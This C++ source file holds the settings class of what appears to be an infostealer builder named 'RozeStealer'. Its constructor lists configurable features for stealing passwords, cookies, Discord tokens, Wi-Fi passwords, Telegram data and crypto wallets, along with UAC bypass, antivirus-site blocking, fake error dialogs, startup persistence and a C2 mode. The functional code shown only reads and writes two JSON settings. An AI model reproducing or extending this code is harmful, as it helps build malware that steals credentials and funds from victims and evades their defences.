#include "Settings.h"
#include <fstream>
#include <iostream>
#include "nlohmann/json.hpp"

namespace RozeStealer {

Settings::Settings() : 
    updatesCheck(true),
    password("blank123"),
    pingMe(false),
    vmProtect(false),
    startup(false),
    melt(false),
    fakeError(false),
    fakeErrorTitle(""),
    fakeErrorMessage(""),
    fakeErrorIcon(0),
    blockAvSites(false),
    discordInjection(false),
    uacBypass(false),
    pumpStub(false),
    pumpLimit(0),
    captureWebcam(false),
    capturePasswords(false),
    captureCookies(false),
    captureHistory(false),
    captureAutofills(false),
    captureDiscordTokens(false),
    captureGames(false),
    captureWifiPasswords(false),
    captureSystemInfo(false),
    captureScreenshot(false),
    captureTelegram(false),
    captureCommonFiles(false),
    captureWallets(false),
    boundExePath(""),
    boundExeRunOnStartup(false),
    outputAsExe(true),
    consoleMode(0),
    c2Mode(0),
    c2Entry("")
{
}

void Settings::loadConfig(const std::string& configFile) {
    std::ifstream ifs(configFile);
    if (ifs.is_open()) {
        nlohmann::json j;
        ifs >> j;
        updatesCheck = j.value("Check for updates", updatesCheck);
        password = j.value("Password", password);
        ifs.close();
    }
}

void Settings::saveConfig(const std::string& configFile) {
    nlohmann::json j;
    j["Check for updates"] = updatesCheck;
    j["Password"] = password;

    std::ofstream ofs(configFile);
    if (ofs.is_open()) {
        ofs << j.dump(4);
        ofs.close();
    }
}

} // namespace RozeStealer

